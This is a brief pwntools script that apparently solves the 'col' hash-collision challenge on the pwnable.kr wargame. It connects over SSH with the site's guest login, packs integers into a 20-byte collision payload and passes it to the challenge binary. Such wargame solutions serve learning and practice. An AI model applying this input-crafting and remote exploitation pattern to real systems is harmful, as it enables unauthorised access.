from pwn import *

sh = ssh(user='col', host='pwnable.kr', port=2222, password='guest')
num1 = 113626824
num2 = 113626828
playload = p32(num1) * 4 + p32(num2)
p = sh.process(executable='./col',argv=['col',playload])
p.interactive()
